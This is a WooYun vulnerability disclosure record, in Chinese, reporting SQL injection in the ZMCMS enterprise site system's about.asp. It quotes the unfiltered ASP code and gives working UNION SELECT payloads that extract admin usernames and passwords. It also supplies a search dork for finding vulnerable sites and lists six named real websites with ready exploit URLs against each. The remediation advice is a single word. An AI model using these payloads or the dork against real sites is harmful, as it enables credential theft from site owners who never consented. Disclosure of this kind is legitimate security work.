{"id": 52807, "wybug_id": "wooyun-2014-070083", "wybug_title": "某通用型企业网站管理系统sql注入", "wybug_corp": "追梦企业网站管理系统", "wybug_author": "roker", "wybug_date": "2014-07-29 15:15", "wybug_open_date": "2014-10-27 15:16", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-07-29：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-07-30：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-08-02：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-09-23：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-10-03：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-10-13：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-10-27：\t细节向公众公开  简要描述： rt 详细说明：  追梦企业网站管理系统（zmcms）是由追梦工作室基于asp+access/mssql自主研发而成。我们致力于中小企业网站的搭建。根据现有企业的需求。开发适合企业的模块，让企业可以轻松搭建适合自己企业的网站，后台功能强大，管理便捷。代码简单易懂，适合二次开发。我们认为“简单就是美”，因此一直以来，追梦工作室在开发过程中无处不充分考虑用户的使用习惯，尽最大可能降低用户的使用门槛，让用户关注于内容维护本身，而不需要投入过多的时间来学习系统的使用技巧，在细节处下大工夫。..看到 inc/about.asp\n<%id=request.QueryString(\"id\")set rs=server.createobject(\"adodb.recordset\") sql=\"select * from dy where id=\"&idrs.open sql,conn,1,1id=rs(\"id\")title=rs(\"title\")content=UBBCode(rs(\"content\"))gjza=rs(\"gjz1\")msa=rs(\"ms\")zdfy=rs(\"zdfy\")zmone=rs(\"zmone\")if rs.eof and rs.bof thenResponse.Write(\"<script language=javascript> alert('信息内容已被删除!');window.location.replace('index.asp');</script>\")end if%>\n直接将id带入了sql语句，没有过滤。类似的文件在 inc文件夹下还有很多。前台 about.asp \n<%@LANGUAGE=\"VBSCRIPT\" CODEPAGE=\"65001\"%><!--#include file=\"Inc/sub.asp\" -->  <!--#include file=\"Inc/about.asp\" -->\n包含了进来。exp \nabout.asp?id=%201%20union%20select%201,password,3,4,5,6,7,8,9,10,11,12,13,14,15%20from%20adminabout.asp?id=%201%20union%20select%201,username,3,4,5,6,7,8,9,10,11,12,13,14,15%20from%20admin没显示全的话 就用 mid（）。\n虽然漏洞挺简单的。但是用户量还是蛮多滴。。。关键字 inurl:\"product.asp?pone=\"\n\n5个实例用以证明通用。\n\nhttp://www.whhnt.com/about.asp?id=%201%20union%20select%201,password,3,4,5,6,7,8,9,10,11,12,13,14,15%20from%20adminhttp://www.qqlqq.com/about.asp?id=%201%20union%20select%201,password,3,4,5,6,7,8,9,10,11,12,13,14,15%20from%20adminhttp://www.sl138.com/about.asp?id=%201%20union%20select%201,password,3,4,5,6,7,8,9,10,11,12,13,14,15%20from%20adminhttp://www.it8088.com/about.asp?id=%201%20union%20select%201,password,3,4,5,6,7,8,9,10,11,12,13,14,15%20from%20adminhttp://www.hqgg.com/about.asp?id=%201%20union%20select%201,password,3,4,5,6,7,8,9,10,11,12,13,14,15%20from%20admin特殊例子。2的位置显示不出来的话 就用3来显示 需要mid http://www.ykml.cn/about.asp?id=%201%20union%20select%201,2,username,4,5,6,7,8,9,10,11,12,13,14%20from%20admin http://www.ykml.cn/about.asp?id=%201%20union%20select%201,2,mid(username,4,5),4,5,6,7,8,9,10,11,12,13,14%20from%20admin        漏洞证明：  \n\n   修复方案：  过滤   版权声明：转载请注明来源 roker@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：17  确认时间：2014-07-30 09:31 厂商回复： CNVD未能通过公开渠道获知软件生产厂商联系方式，暂未涉及政府和重要部门案例，未列入处置流程，待厂商认领。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-08-22 00:16 |    \t\tU神 \t\t\t( 核心白帽子 |\t\t\t        Rank:1285 漏洞数:142        | 感谢乌云，知恩不忘，其实我一直都在乌云默...)\t\t \n  太尼玛会刷了    \n     2014-08-22 00:32 |    \t\troker \t\t\t( 普通白帽子  |\t\t\t        Rank:357 漏洞数:108        )\t\t \n  @U神 0.0    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 17, "Ranks": null}